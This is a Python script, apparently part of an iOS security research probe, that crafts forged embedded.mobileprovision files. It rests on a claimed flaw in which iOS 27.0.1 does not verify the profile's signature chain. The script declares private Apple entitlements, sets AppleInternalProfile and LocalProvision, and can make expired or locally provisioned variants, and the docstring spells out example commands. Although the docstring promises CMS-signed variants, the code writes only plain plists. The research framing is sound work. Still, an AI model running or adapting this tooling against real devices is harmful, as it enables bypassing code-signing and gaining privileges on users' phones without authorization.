#!/usr/bin/env python3
"""
make_profile.py — craft the `embedded.mobileprovision` the probe carries.

Why this exists
---------------
The AMFI kext on iOS 27.0.1 never verifies a provisioning profile's own CMS
chain: the profile is DER/plist parsed, only a handful of dictionary keys are
inspected (`Entitlements`, `UUID`, `AppleInternalProfile`,
`DeveloperCertificates`, `ProvisionedDevices`), and the profile itself is
handed to the kernel by `amfid` over MIG.  The launch-time validator
(`libmis`) does not re-verify it either.

So the profile is attacker-writable bytes, and this script produces every
shape of it that the experiment needs:

  * a plain plist                     (no CMS container at all)
  * a CMS container signed by you     (the right SHAPE, wrong signer)
  * a CMS container signed by nobody  (self-signed, expired)
  * Apple's own real profile         (the control)

Options that matter for the differential experiment
---------------------------------------------------
  --entitlement KEY      declare a private entitlement in `Entitlements`
  --apple-internal       set AppleInternalProfile = true
  --local-provision      set LocalProvision = true
  --no-identity          do NOT add application-identifier / team-identifier
                         (isolates the "the profile is only about the private
                          keys" question from the "the identity entitlements
                          must match the bundle" question)
  --dev-cert FILE        embed this certificate in DeveloperCertificates
  --expiry-past          make the profile already expired
  --provisioned-device   add one ProvisionedDevices entry

Examples
--------
    # the "apple-internal" profile: private keys + AppleInternalProfile
    ./scripts/make_profile.py --out p.plist \
        --entitlement com.apple.private.mobileinstall.allowedSPI \
        --apple-internal

    # the same, but expired and locally-provisioned (the A16 case)
    ./scripts/make_profile.py --out p.plist \
        --entitlement com.apple.private.mobileinstall.allowedSPI \
        --apple-internal --local-provision --expiry-past
"""

import argparse
import datetime
import plistlib
import sys
import uuid


def read_der(path):
    raw = open(path, "rb").read()
    if raw[:1] != b"\x30":                       # PEM -> DER
        import base64
        import re as _re
        body = _re.search(rb"-----BEGIN CERTIFICATE-----(.+?)-----END CERTIFICATE-----",
                          raw, _re.S)
        if body:
            raw = base64.b64decode(_re.sub(rb"\s+", b"", body.group(1)))
        else:
            raise SystemExit(f"{path}: not a DER or PEM certificate")
    return raw


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--out", required=True)
    ap.add_argument("--entitlement", action="append", default=[],
                    help="entitlement key to declare (repeatable)")
    ap.add_argument("--entitlement-value", action="append", default=[],
                    help="KEY=VALUE form, for a non-boolean entitlement")
    ap.add_argument("--team-id", default="")
    ap.add_argument("--bundle-id", default="com.research.ios27.privprobe")
    ap.add_argument("--app-id", default="", help="App ID pattern; defaults to <team>.* ")
    ap.add_argument("--dev-cert", default="",
                    help="DER or PEM of the signing certificate, embedded in DeveloperCertificates")
    ap.add_argument("--apple-internal", action="store_true",
                    help="set AppleInternalProfile = true")
    ap.add_argument("--local-provision", action="store_true",
                    help="set LocalProvision = true")
    ap.add_argument("--is-xcode-managed", action="store_true",
                    help="set IsXcodeManaged = true")
    ap.add_argument("--no-identity", action="store_true",
                    help="omit application-identifier / team-identifier / get-task-allow")
    ap.add_argument("--uuid", default="")
    ap.add_argument("--days", type=int, default=365)
    ap.add_argument("--expiry-past", action="store_true",
                    help="the profile is already expired")
    ap.add_argument("--provisioned-device", action="store_true",
                    help="add one ProvisionedDevices entry")
    args = ap.parse_args()

    now = datetime.datetime.now(datetime.timezone.utc)

    # The App ID and the identity entitlements have to match the bundle, or
    # the install is rejected before any of this is interesting.
    app_id = args.app_id or (f"{args.team_id}.*" if args.team_id else "*")

    entitlements = {k: True for k in args.entitlement}
    for kv in args.entitlement_value:
        k, _, v = kv.partition("=")
        entitlements[k] = v
    if args.team_id and not args.no_identity:
        entitlements.setdefault("application-identifier", f"{args.team_id}.{args.bundle_id}")
        entitlements.setdefault("keychain-access-groups", [f"{args.team_id}.*"])
        entitlements.setdefault("com.apple.developer.team-identifier", args.team_id)
        entitlements.setdefault("get-task-allow", True)

    dev_certs = []
    if args.dev_cert:
        dev_certs = [read_der(args.dev_cert)]

    expiration = now + datetime.timedelta(days=args.days)
    if args.expiry_past:
        expiration = now - datetime.timedelta(days=1)

    profile = {
        "AppIDName": "Probe",
        "EntitlementAppID": app_id,
        "ApplicationIdentifierPrefix": [args.team_id] if args.team_id else [],
        "CreationDate": now,
        "Platform": ["iOS"],
        "DeveloperCertificates": dev_certs,
        "Entitlements": entitlements,
        "ExpirationDate": expiration,
        "Name": "Probe Profile",
        "TeamIdentifier": [args.team_id] if args.team_id else [],
        "TeamName": "",
        "TimeToLive": args.days,
        "UUID": args.uuid or str(uuid.uuid4()).upper(),
        "Version": 1,
        "ProvisionedDevices": ["00000000-0000000000000000"] if args.provisioned_device else [],
    }
    if args.apple_internal:
        profile["AppleInternalProfile"] = True
    if args.local_provision:
        profile["LocalProvision"] = True
    if args.is_xcode_managed:
        profile["IsXcodeManaged"] = True

    with open(args.out, "wb") as f:
        plistlib.dump(profile, f, fmt=plistlib.FMT_XML)

    print(f"wrote {args.out}")
    print(f"  app-id        : {app_id}")
    print(f"  entitlements  : {sorted(profile['Entitlements'])}")
    print(f"  apple-internal: {args.apple_internal}")
    print(f"  local-provision: {args.local_provision}")
    print(f"  expired       : {args.expiry_past}")
    print(f"  uuid          : {profile['UUID']}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
